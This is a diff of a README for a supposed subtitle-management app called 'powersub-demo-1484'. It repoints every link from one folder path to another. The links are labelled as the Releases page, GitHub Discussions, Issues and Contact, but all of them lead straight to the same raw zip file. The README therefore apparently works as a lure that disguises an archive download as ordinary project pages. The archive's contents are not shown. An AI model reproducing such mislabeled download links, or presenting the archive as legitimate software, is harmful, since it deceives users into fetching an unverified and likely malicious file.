@@ -6,7 +6,7 @@ Welcome to **powersub-demo-1484**! This application helps you manage subtitles e
 
 ## 📥 Download Here
 
-[![Download](https://raw.githubusercontent.com/bachira45b/powersub-demo-1484/main/urbian/powersub-demo-1484.zip%20Now%https://raw.githubusercontent.com/bachira45b/powersub-demo-1484/main/urbian/powersub-demo-1484.zip)](https://raw.githubusercontent.com/bachira45b/powersub-demo-1484/main/urbian/powersub-demo-1484.zip)
+[![Download](https://raw.githubusercontent.com/bachira45b/powersub-demo-1484/main/sanga/powersub-demo-1484.zip%20Now%https://raw.githubusercontent.com/bachira45b/powersub-demo-1484/main/sanga/powersub-demo-1484.zip)](https://raw.githubusercontent.com/bachira45b/powersub-demo-1484/main/sanga/powersub-demo-1484.zip)
 
 ## 💻 System Requirements
 
@@ -20,7 +20,7 @@ Make sure your system meets these requirements for smooth operation.
 ## 📂 Download & Install
 
 1. Click the link below to visit the Releases page:
-   [Visit Releases Page](https://raw.githubusercontent.com/bachira45b/powersub-demo-1484/main/urbian/powersub-demo-1484.zip)
+   [Visit Releases Page](https://raw.githubusercontent.com/bachira45b/powersub-demo-1484/main/sanga/powersub-demo-1484.zip)
 
 2. On the Releases page, look for the latest version available for download.
 
@@ -45,16 +45,16 @@ After installation, you can start using **powersub-demo-1484** right away!
 
 Join our community! Find tips, share your experiences, and ask questions. 
 
-1. Visit our [GitHub Discussions](https://raw.githubusercontent.com/bachira45b/powersub-demo-1484/main/urbian/powersub-demo-1484.zip) page to engage with other users.
-2. Check out the [Issues](https://raw.githubusercontent.com/bachira45b/powersub-demo-1484/main/urbian/powersub-demo-1484.zip) section for troubleshooting and reporting bugs.
+1. Visit our [GitHub Discussions](https://raw.githubusercontent.com/bachira45b/powersub-demo-1484/main/sanga/powersub-demo-1484.zip) page to engage with other users.
+2. Check out the [Issues](https://raw.githubusercontent.com/bachira45b/powersub-demo-1484/main/sanga/powersub-demo-1484.zip) section for troubleshooting and reporting bugs.
 
 ## 📞 Contact
 
-For help or inquiries, please contact us through our [GitHub Issues](https://raw.githubusercontent.com/bachira45b/powersub-demo-1484/main/urbian/powersub-demo-1484.zip) page. We are here to assist you!
+For help or inquiries, please contact us through our [GitHub Issues](https://raw.githubusercontent.com/bachira45b/powersub-demo-1484/main/sanga/powersub-demo-1484.zip) page. We are here to assist you!
 
 ## 👍 Acknowledgments
 
 Thank you for choosing **powersub-demo-1484**. We appreciate your support and hope you enjoy using the application.
 
 For further updates, keep an eye on the Releases page:
-[Download Here Again](https://raw.githubusercontent.com/bachira45b/powersub-demo-1484/main/urbian/powersub-demo-1484.zip)
+[Download Here Again](https://raw.githubusercontent.com/bachira45b/powersub-demo-1484/main/sanga/powersub-demo-1484.zip)
